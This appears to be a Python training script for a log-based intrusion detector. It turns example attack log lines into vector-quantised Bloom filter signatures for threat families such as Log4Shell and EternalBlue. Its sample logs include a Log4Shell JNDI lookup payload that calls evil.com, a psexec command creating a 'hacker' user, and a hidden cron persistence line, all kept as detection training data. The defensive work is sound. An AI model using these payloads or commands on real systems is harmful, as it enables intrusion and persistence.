#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
adalog_training.py
--------------------------------------------------------
Offline training system using ADALog to generate Bloom filter signatures

This separates the slow semantic processing (training) from fast production queries.

Architecture:
1. Training (offline): ADALog semantic encoder → Generate example embeddings → Store VQ codes
2. Production (real-time): Quick embedding → VQ quantization → Bloom filter lookup (O(1))

This gives us:
- Semantic understanding (from ADALog training)
- Bloom filter speed (3,000+ logs/sec)
- Constant memory (no full embeddings stored)
"""

import numpy as np
import json
from pathlib import Path
from typing import Dict, List, Set, Tuple
from collections import defaultdict

try:
    from adalog_semantic_encoder import ADALogSemanticEncoder
    SEMANTIC_AVAILABLE = True
except ImportError:
    try:
        from .adalog_semantic_encoder import ADALogSemanticEncoder
        SEMANTIC_AVAILABLE = True
    except ImportError:
        SEMANTIC_AVAILABLE = False


class ADALogTrainer:
    """
    Offline training system that uses ADALog to generate Bloom filter signatures

    Process:
    1. Load CVE descriptions and example attack logs
    2. Generate semantic embeddings using ADALog
    3. Quantize embeddings to discrete VQ codes
    4. Store VQ codes as Bloom filter signatures
    5. Save trained model for production use
    """

    def __init__(self, families: List[str], vq_codebook_size: int = 32, embed_dim: int = 384):
        """
        Initialize trainer

        Args:
            families: List of threat family names to train on
            vq_codebook_size: Size of VQ codebook for quantization
            embed_dim: Embedding dimension (384 for sentence transformers)
        """
        if not SEMANTIC_AVAILABLE:
            raise ImportError("ADALog semantic encoder required. Install with: pip install sentence-transformers")

        self.families = families
        self.vq_codebook_size = vq_codebook_size
        self.embed_dim = embed_dim

        # Initialize semantic encoder
        print("Initializing ADALog semantic encoder...")
        self.semantic_encoder = ADALogSemanticEncoder(embed_dim, families)

        # Initialize VQ codebook (will be trained on embeddings)
        self.vq_codebook = None
        self.family_vq_codes = defaultdict(set)  # family -> set of VQ codes

        print(f"✓ Trainer initialized for {len(families)} families")

    def train_vq_codebook(self, example_logs: Dict[str, List[str]]):
        """
        Train VQ codebook on example logs from all families

        Args:
            example_logs: Dictionary mapping family name to list of example log texts
        """
        print("\nTraining VQ codebook on example logs...")

        # Collect all embeddings
        all_embeddings = []
        for family, logs in example_logs.items():
            if family in self.families:
                print(f"  Processing {family}: {len(logs)} examples")
                for log in logs:
                    emb = self.semantic_encoder.embed(log)
                    all_embeddings.append(emb)

        if len(all_embeddings) == 0:
            raise ValueError("No training examples provided")

        # Stack embeddings
        X = np.vstack(all_embeddings)
        print(f"  Total training embeddings: {len(X)}")

        # Train VQ codebook using k-means
        from sklearn.cluster import MiniBatchKMeans

        print(f"  Training {self.vq_codebook_size}-entry codebook...")
        kmeans = MiniBatchKMeans(
            n_clusters=self.vq_codebook_size,
            batch_size=128,
            random_state=42,
            max_iter=100
        )
        kmeans.fit(X)

        self.vq_codebook = kmeans.cluster_centers_
        print(f"✓ VQ codebook trained")

    def quantize_embedding(self, embedding: np.ndarray) -> int:
        """
        Quantize embedding to nearest VQ code

        Args:
            embedding: Embedding vector

        Returns:
            VQ code index
        """
        if self.vq_codebook is None:
            raise ValueError("VQ codebook not trained. Call train_vq_codebook() first")

        # Find nearest centroid
        dists = np.sum((self.vq_codebook - embedding.reshape(1, -1)) ** 2, axis=1)
        return int(np.argmin(dists))

    def generate_family_signatures(self, example_logs: Dict[str, List[str]],
                                   similarity_threshold: float = 0.25):
        """
        Generate Bloom filter signatures for each family

        Args:
            example_logs: Dictionary mapping family name to list of example log texts
            similarity_threshold: Minimum semantic similarity to consider a match

        Returns:
            Dictionary mapping family to set of VQ codes (Bloom signatures)
        """
        print("\nGenerating Bloom filter signatures...")

        for family, logs in example_logs.items():
            if family not in self.families:
                continue

            print(f"  {family}: {len(logs)} examples")
            vq_codes = set()

            for log in logs:
                # Get semantic embedding
                emb = self.semantic_encoder.embed(log)

                # Quantize to VQ code
                vq_code = self.quantize_embedding(emb)
                vq_codes.add(vq_code)

            self.family_vq_codes[family] = vq_codes
            print(f"     → {len(vq_codes)} unique VQ codes")

        print(f"✓ Generated signatures for {len(self.family_vq_codes)} families")
        return dict(self.family_vq_codes)

    def save_model(self, output_path: str):
        """
        Save trained model (VQ codebook + family signatures)

        Args:
            output_path: Path to save model
        """
        model = {
            'families': self.families,
            'embed_dim': self.embed_dim,
            'vq_codebook_size': self.vq_codebook_size,
            'vq_codebook': self.vq_codebook.tolist(),
            'family_vq_codes': {
                family: list(codes)
                for family, codes in self.family_vq_codes.items()
            },
            'semantic_encoder_config': {
                'model_name': 'all-MiniLM-L6-v2',
                'cve_descriptions': self.semantic_encoder.cve_descriptions,
                'stage_descriptions': self.semantic_encoder.stage_descriptions
            }
        }

        Path(output_path).parent.mkdir(parents=True, exist_ok=True)
        with open(output_path, 'w') as f:
            json.dump(model, f, indent=2)

        print(f"✓ Model saved to {output_path}")

    def load_model(self, model_path: str):
        """
        Load pre-trained model

        Args:
            model_path: Path to saved model
        """
        with open(model_path, 'r') as f:
            model = json.load(f)

        self.families = model['families']
        self.embed_dim = model['embed_dim']
        self.vq_codebook_size = model['vq_codebook_size']
        self.vq_codebook = np.array(model['vq_codebook'], dtype=np.float32)
        self.family_vq_codes = {
            family: set(codes)
            for family, codes in model['family_vq_codes'].items()
        }

        print(f"✓ Model loaded from {model_path}")
        print(f"   Families: {len(self.families)}")
        print(f"   VQ codebook size: {self.vq_codebook_size}")
        print(f"   Total signatures: {sum(len(codes) for codes in self.family_vq_codes.values())}")


def train_from_cve_descriptions():
    """
    Train model using built-in CVE descriptions from ADALog
    """
    print("\n" + "="*70)
    print("ADALOG TRAINING - OFFLINE SIGNATURE GENERATION")
    print("="*70)

    families = [
        "CVE-2024-6387", "CVE-2021-44228", "CVE-2017-0144",
        "reconnaissance", "exploitation", "privilege_escalation",
        "persistence", "lateral_movement", "exfiltration"
    ]

    trainer = ADALogTrainer(families)

    # Use descriptions from semantic encoder as training examples
    example_logs = {}

    # CVE examples
    example_logs["CVE-2024-6387"] = [
        "sshd[16078]: SIGALRM received during authentication from 45.67.11.242",
        "kernel: sshd[16078]: segfault at 7fff8badc000 ip 00007f9abc123456",
        "SSH service crashed during login with alarm signal",
        "sshd daemon core dump in signal handler during auth",
        "OpenSSH race condition caused authentication failure and crash"
    ]

    example_logs["CVE-2021-44228"] = [
        "GET /api/search?query=${jndi:ldap://evil.com/Exploit}",
        "java: Runtime.exec() called from JNDI lookup",
        "Log4j processing malicious JNDI string",
        "ProcessBuilder executing command from log4j interpolation",
        "LDAP connection initiated from Java application logs"
    ]

    example_logs["CVE-2017-0144"] = [
        "kernel: SMB: NT_STATUS_INSUFF_SERVER_RESOURCES from 45.67.14.70",
        "smbd: Multiple failed authentication attempts using SMB1 protocol",
        "psexec: \\\\web-server-4 cmd.exe /c net user hacker",
        "File encryption: document.docx renamed to document.docx.locked",
        "Ransom note created: README_DECRYPT.txt with bitcoin address"
    ]

    example_logs["reconnaissance"] = [
        "nmap scan detected from 45.67.1.1",
        "Port scanning activity: 22, 80, 443, 3389",
        "Service enumeration via banner grabbing"
    ]

    example_logs["exploitation"] = [
        "Exploit payload delivered via HTTP POST",
        "Remote code execution attempt detected",
        "Shell code injection in web parameter"
    ]

    example_logs["privilege_escalation"] = [
        "Process gained root privileges: uid=0 euid=0",
        "Privilege escalation via kernel exploit",
        "Administrator access obtained by unprivileged user"
    ]

    example_logs["persistence"] = [
        "Malicious cron job created: */5 * * * * /tmp/.hidden",
        "Backdoor service installed in systemd",
        "Registry run key modified for persistence"
    ]

    example_logs["lateral_movement"] = [
        "Pivoting to internal network from compromised host",
        "Using stolen credentials on 192.168.1.50",
        "Pass-the-hash attack detected on domain controller"
    ]

    example_logs["exfiltration"] = [
        "Large outbound data transfer to 45.67.89.100:443",
        "Reverse shell established to external IP",
        "50GB data exfiltration over encrypted channel"
    ]

    # Train VQ codebook
    trainer.train_vq_codebook(example_logs)

    # Generate signatures
    signatures = trainer.generate_family_signatures(example_logs)

    # Show signature distribution
    print(f"\n📊 Signature Distribution:")
    for family, codes in sorted(signatures.items()):
        print(f"   {family}: {len(codes)} VQ codes")

    # Save model
    output_path = "models/adalog_bloom_signatures.json"
    trainer.save_model(output_path)

    print(f"\n{'='*70}")
    print("TRAINING COMPLETE")
    print(f"{'='*70}")
    print(f"\n✅ Model ready for production use")
    print(f"   • Fast VQ-based detection")
    print(f"   • Bloom filter O(1) lookup")
    print(f"   • Semantic understanding from ADALog")
    print(f"   • Model path: {output_path}")
    print(f"\n{'='*70}\n")

    return trainer


if __name__ == "__main__":
    train_from_cve_descriptions()
